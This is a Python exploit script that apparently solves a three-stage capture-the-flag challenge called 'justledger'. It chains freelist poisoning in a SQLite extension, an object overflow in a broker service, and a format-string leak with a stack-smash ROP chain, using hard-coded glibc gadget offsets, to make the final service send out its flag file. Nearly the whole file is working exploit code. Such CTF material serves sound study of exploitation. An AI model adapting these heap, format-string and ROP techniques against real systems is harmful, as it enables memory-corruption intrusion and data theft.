#!/usr/bin/env python3
"""12072 justledger — full chain (all three memory-corruption stages).

  [0] listener (tcp)  -> justledger (SQLite front-end)          fd3 = broker socket
  [1] ledgerprobe.so : mark -> drop -> touch  => freelist poisoning => 96-byte write
      at probe.bss+0x5108, forging ledger_fire's target+cookie => jumps to the .so's
      relay (0x1c10) which bridges our socket to fd3 (broker).
  [2] ledgerbroker   : WINDOW 8-bit-sum bounds bug => overflow into the neighbouring
      ROUTE object => forge enc/hash => '~' jumps to the broker relay (0x2120)
      => bridged to the vault.
  [3] ledgervault    : op 0x91 format string (no varargs) leaks canary/PIE/libc/flag-fd;
      op 0xA7 `(u8)len<0x81` stack smash => sendfile(1, flag_fd, 0, 0x200).

Usage:  python3 12072-solve.py <host> <port>
"""
import re
import socket
import struct
import sys
import time

MASK64 = (1 << 64) - 1
TAG_ROUTE = 0x524F555445330000
RELAY_PROBE = 0x1C10       # ledgerprobe.so relay (poll/read/sendmsg fd0+fd3)
RELAY_BROKER = 0x2120      # ledgerbroker relay (poll/read/write fd0+fd3)
COOKIE_MIX = 0x91E10DA5C79B43F2
C1 = 0xBF58476D1CE4E5B9
C2 = 0x94D049BB133111EB
C0 = 0x6F27C4B19A5E38D2


def ror(x, n):
    return ((x >> n) | (x << (64 - n))) & MASK64


def rol(x, n):
    return ((x << n) | (x >> (64 - n))) & MASK64


def mix(seq, enc, rnd):
    x = (seq ^ enc ^ rnd ^ C0) & MASK64
    x = ((x >> 0x1E) ^ x) * C1 & MASK64
    x = ((x ^ (x >> 0x1B)) * C2) & MASK64
    return (x ^ (x >> 0x1F)) & MASK64


class Link:
    """one TCP socket carrying every stage"""

    def __init__(self, host, port, timeout=6.0):
        self.s = socket.create_connection((host, port), timeout)
        self.s.settimeout(timeout)
        self.buf = b""

    def send(self, b):
        self.s.sendall(b)

    def recv_some(self, t=1.5, n=65536, until=None):
        self.s.settimeout(t)
        out = b""
        while True:
            try:
                d = self.s.recv(n)
            except Exception:
                break
            if not d:
                break
            out += d
            if until is not None:
                if out.endswith(until):
                    break
            elif len(d) < n:
                break
        return out

    def recvn(self, n, t=4.0):
        self.s.settimeout(t)
        out = b""
        while len(out) < n:
            d = self.s.recv(n - len(out))
            if not d:
                raise EOFError(f"eof want {n} got {len(out)}")
            out += d
        return out


# --------------------------------------------------------------------------- #
# stage 1: justledger / ledgerprobe.so
# --------------------------------------------------------------------------- #
class Sql:
    def __init__(self, link):
        self.lk = link
        self.banner = link.recvn(11)      # "justledger\n"
        assert b"justledger" in self.banner, self.banner

    def stmt(self, text, t=1.5):
        self.lk.send(text.encode() + b"\n")
        out = b""
        deadline = time.time() + t
        while time.time() < deadline:
            out += self.lk.recv_some(0.35)
            if out.endswith(b"OK\n") or out.endswith(b"ERR\n"):
                break
        return out

    def blob(self, text, t=1.5):
        out = self.stmt(text, t)
        m = re.search(rb"ROW ([0-9a-f]+)\n", out)
        return bytes.fromhex(m.group(1).decode()) if m else None

    # -- unlock the lease: the second statement re-runs ledger_seed() as ledger_bind's
    #    first argument, which reuses the freed aMem block at exactly the captured
    #    address, so sqlite3_value_pointer() sees a live MEM_Ptr again.
    def unlock(self):
        self.stmt("SELECT * FROM ledger WHERE seal=ledger_seed();")
        r = self.stmt("SELECT ledger_bind(ledger_seed(),1);")
        assert b"ROW 31" in r, r        # result_int(1) -> "1"
        return r

    def stage1(self, log=print):
        # slot 0: a type-1 object (leaks probe base + heap + rnd2 through [4],[5],[6])
        self.stmt("SELECT ledger_make(0,1,x'%s');" % ("00" * 96))
        self.stmt("SELECT ledger_make(1,1,x'%s');" % ("00" * 96))
        self.stmt("SELECT ledger_mark(0);")
        leak = self.blob("SELECT ledger_audit();")
        f4, f5, f6 = struct.unpack("<3Q", leak[:24])
        probe = f4 - 0x1260                      # &FUN_00101260 inside ledgerprobe.so
        obj0 = f5
        # [6] = &FUN_00101260 ^ rnd2 ^ ROR(obj,12)  (the lea'd real address, not 0x1260)
        rnd2 = f6 ^ f4 ^ (((obj0 >> 12) | (obj0 << 52)) & MASK64)
        log(f"    probe.so={probe:#x} obj0={obj0:#x} rnd2={rnd2:#x}")
        assert probe & 0xFFF == 0
        self.stmt("SELECT ledger_mark(1);")
        leak = self.blob("SELECT ledger_audit();")
        f4, f5b, f6 = struct.unpack("<3Q", leak[:24])
        obj1 = f5b
        assert (f4 - 0x1260) == probe
        # two-entry freelist: obj1 -> obj0 ; poison obj1 so the next head becomes T
        self.stmt("SELECT ledger_mark(0);")
        self.stmt("SELECT ledger_drop(0);")
        self.stmt("SELECT ledger_mark(1);")
        self.stmt("SELECT ledger_drop(1);")
        T = probe + 0x5108                       # zero+write window covers 0x5110 / 0x5118
        self.stmt("SELECT ledger_mark(1);")
        self.stmt("SELECT ledger_touch(x'%s');" % struct.pack("<Q", (obj1 >> 12) ^ T).hex())
        # pop obj1 (sets head = T), then pop T and write our 96 bytes there
        r = self.stmt("SELECT ledger_make(2,0,x'%s');" % ("00" * 96))
        log(f"    filler make -> {r!r}")
        target = probe + RELAY_PROBE
        cookie = rol((target ^ rnd2 ^ COOKIE_MIX) & MASK64, 0x17)
        blob = bytearray(96)
        struct.pack_into("<Q", blob, 0x08, target)     # .bss+0x5110 -> fire target
        struct.pack_into("<Q", blob, 0x10, cookie)     # .bss+0x5118 -> cookie
        r = self.stmt("SELECT ledger_make(3,2,x'%s');" % blob.hex())
        log(f"    make@T -> {r!r}")
        self.stmt("SELECT ledger_fire();", t=0.6)       # jmp *0x5110 -> relay(0x1c10)
        time.sleep(0.3)
        return True


# --------------------------------------------------------------------------- #
# stage 2: ledgerbroker
# --------------------------------------------------------------------------- #
class Broker:
    def __init__(self, link):
        self.lk = link
        # the broker banner was emitted long before our relay came up and is not
        # always forwarded - treat it as optional
        try:
            self.banner = link.recvn(8, t=1.0)
        except Exception:
            self.banner = b""
        if self.banner and self.banner[:4] != b"LBR3":
            raise RuntimeError(f"desync: {self.banner!r}")

    def cmd(self, op, idx, payload=b""):
        self.lk.send(bytes([op & 0xFF, idx & 0xFF]) + struct.pack("<H", len(payload)) + payload)
        hdr = self.lk.recvn(4)
        st, rop, ln = hdr[0], hdr[1], struct.unpack("<H", hdr[2:4])[0]
        return st, rop, (self.lk.recvn(ln) if ln else b"")

    def stage2(self, log=print):
        for i in range(8):
            self.cmd(ord("1"), i)                   # WINDOW
        for i in range(8):
            self.cmd(ord("Y"), i)                   # ROUTE
        st, _, blob = self.cmd(ord("j"), 7, struct.pack("<HH", 0x100, 0x600))
        assert st == 0
        offs = [o for o in range(len(blob) - 8)
                if struct.unpack_from("<Q", blob, o)[0] == TAG_ROUTE]
        assert offs, "no route next to window 7"
        off = offs[0]
        seq, enc, hsh, self_, encfp, fptr = struct.unpack_from("<6Q", blob, off + 8)
        base = fptr - 0x1760
        rnd = encfp ^ (base + 0x1760) ^ ror(self_, 0x11)
        assert (ror(enc, 0x1D) ^ self_ ^ rnd) == (base + 0x1770)
        assert mix(seq, enc, rnd) == hsh
        target = base + RELAY_BROKER
        enc2 = rol((target ^ self_ ^ rnd) & MASK64, 0x1D)
        hsh2 = mix(seq, enc2, rnd)
        log(f"    broker base={base:#x} route@{off:#x} -> relay {target:#x}")
        new = bytearray(blob[:0x220])
        struct.pack_into("<Q", new, off + 16, enc2)
        struct.pack_into("<Q", new, off + 24, hsh2)
        st, _, _ = self.cmd(ord("k"), 7, struct.pack("<HH", 0x100, len(new)) + bytes(new))
        assert st == 0, st
        self.lk.send(bytes([ord("~"), 0]) + struct.pack("<H", 0))  # relay takes over
        time.sleep(0.3)
        return True


# --------------------------------------------------------------------------- #
# stage 3: ledgervault
# --------------------------------------------------------------------------- #
class Vault:
    SLOT_CANARY = 77
    SLOT_BUF = 44
    SHIFT = 0

    def __init__(self, link):
        self.lk = link
        self.banner = b""
        # the vault wrote its banner long ago; the relays may not forward it
        probe = b""
        for _ in range(4):
            d = link.recv_some(0.4)
            probe += d
            if probe:
                break
        if probe[:4] == b"LVL3":
            self.banner = probe[:8]
            self.lk.buf = probe[8:]
        elif probe:
            self.lk.buf = probe

    def fmt_raw(self, payload: bytes, t=2.0):
        d = payload + b"\x00"
        assert len(d) <= 0xF0, len(d)
        self.lk.send(bytes([0x91, 0]) + struct.pack("<H", len(d)) + d)
        return self.lk.recv_some(t)

    def leak_basic(self):
        d = self.fmt_raw(b",".join([b"%p"] * 78))
        vals = d.decode("latin1").strip().split(",")
        canary = struct.unpack("<Q", struct.pack("<Q", int(vals[self.SLOT_CANARY - 1], 16)))[0]
        pie = int(vals[8], 16) - 0x1B45
        pie2 = int(vals[14], 16) - 0x19B5
        assert pie == pie2 and pie & 0xFFF == 0, (hex(pie), hex(pie2))
        return canary, pie

    def leak_str_at(self, addr, k=72):
        pre = b"%p," * (k - 1) + b"%s"
        off = (k - self.SLOT_BUF) * 8 - self.SHIFT
        buf = pre + b"A" * (off - len(pre)) + struct.pack("<Q", addr)
        d = self.fmt_raw(buf)
        parts = d.split(b",")
        assert len(parts) > k - 1, d[:40]
        return b",".join(parts[k - 1:])

    def stage3(self, log=print):
        canary, pie = self.leak_basic()
        raw = self.leak_str_at(pie + got_read_off)
        read_addr = int.from_bytes(raw[:6], "little")
        assert 0x700000000000 <= read_addr < 0x800000000000, raw[:10]
        libc = read_addr - LIBC_READ
        assert libc & 0xFFF == 0
        raw = self.leak_str_at(pie + 0x4430)
        flagfd = raw[0]
        log(f"    vault pie={pie:#x} libc={libc:#x} canary={canary:#x} flagfd={flagfd}")
        chain = [libc + POP_RDI, 1,
                 libc + POP_RSI, flagfd,
                 libc + POP_RDX_RBX, 0, 0,
                 libc + POP_RCX, 0x200,
                 libc + LIBC_SENDFILE]
        payload = b"A" * 0x108 + struct.pack("<Q", canary) + b"B" * 0x18
        payload += b"".join(struct.pack("<Q", x) for x in chain)
        assert (len(payload) & 0xFF) < 0x81 and len(payload) < 0x401
        self.lk.send(bytes([0xA7, 0]) + struct.pack("<H", len(payload)) + payload)
        return self.lk.recv_some(3.0)


# libc (provided glibc 2.35) constants
LIBC_READ = 0x114920
LIBC_SENDFILE = 0x1192C0
POP_RDI = 0x2A3E5
POP_RSI = 0x2BE51
POP_RDX_RBX = 0x90469
POP_RCX = 0x3D1EE
got_read_off = 0x3F48


def solve(host, port, log=print):
    lk = Link(host, port)
    sql = Sql(lk)
    sql.unlock()
    log("[1] ledgerprobe: lease obtained, poisoning freelist")
    sql.stage1(log)
    log("[2] ledgerbroker: hijacking route -> relay")
    Broker(lk).stage2(log)
    log("[3] ledgervault: format-string leak + ROP sendfile")
    out = Vault(lk).stage3(log)
    return out


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 31337
    out = solve(host, port)
    print("[*] raw:", out[:400])
    m = re.search(rb"[A-Za-z0-9_]+\{[^}]*\}", out)
    print("[*] FLAG:", m.group(0).decode() if m else None)
